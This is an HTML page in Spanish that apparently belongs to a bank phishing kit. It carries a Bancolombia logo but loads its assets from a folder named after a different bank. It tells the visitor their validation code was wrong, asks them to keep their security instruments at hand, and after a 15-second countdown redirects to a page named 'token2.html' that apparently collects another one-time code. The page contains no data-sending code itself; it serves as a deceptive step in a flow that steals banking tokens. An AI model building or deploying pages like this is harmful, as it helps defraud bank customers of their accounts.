<!DOCTYPE html>
<html lang="es">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
  <title>Cargando</title>
  <link rel="icon" href="./BDVenlínea personas_files/favicon.ico" type="image/x-icon">
  <style>
    /* Reset general */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body, html {
      font-family: 'Arial', sans-serif;
      height: 100%;
      background-color: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    /* Contenedor principal */
    #hh {
      width: 100%;
      max-width: 600px;
      text-align: center;
      padding: 20px;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    /* Logo */
    .logo_mobile {
      max-width: 200px;
      margin-bottom: 20px;
    }

    /* Mensaje de carga */
    .loading-message {
      font-size: 18px;
      color: #333;
      margin-top: 20px;
    }

    .loading-message strong {
      color: #007BFF;
      font-weight: bold;
    }

    /* Estilo del gif de carga */
    #ldr {
      width: 100px;
      margin: 20px 0;
    }

    /* Contador */
    #countdown {
      font-size: 24px;
      font-weight: bold;
      color: #333;
    }

    /* Animación de los segundos */
    @keyframes countdownAnimation {
      0% {
        opacity: 0.5;
      }

      100% {
        opacity: 1;
      }
    }

    #countdown {
      animation: countdownAnimation 1s ease-in-out infinite;
    }
  </style>
</head>

<body>

  <div id="hh">
    <!-- Logo -->
    <img class="logo_mobile" src="./BDVenlínea personas_files/logo.png" alt="Bancolombia">

    <!-- Mensaje de carga -->
    <div class="loading-message">
      <p> <strong>El código de validación es incorrecto.</strong> <br> <br> Enviaremos uno nuevo, ten cerca tus instrumentos de seguridad.</p>
      <strong id="time">
        <br><label id="countdown">0:15</label>
      </strong>
    </div>

    <!-- Gif de carga -->
    <img id="ldr" src="./BDVenlínea personas_files/ldr.gif" alt="Cargando">

    <!-- Script del contador -->
    <script type="text/javascript">
      var url = "token2.html";
      var seconds = 15; // número de segundos a contar

      function secondPassed() {
        var minutes = Math.floor((seconds) / 60); // calcula el número de minutos
        var remainingSeconds = seconds % 60; // calcula los segundos
        if (remainingSeconds < 10) {
          remainingSeconds = "0" + remainingSeconds;
        }

        document.getElementById('countdown').innerHTML = minutes + ":" + remainingSeconds;

        if (seconds == 0) {
          clearInterval(countdownTimer);
          window.location = url;
          document.getElementById('countdown').innerHTML = "";
        } else {
          seconds--;
        }
      }

      var countdownTimer = setInterval(secondPassed, 1000);
    </script>
  </div>

</body>

</html>
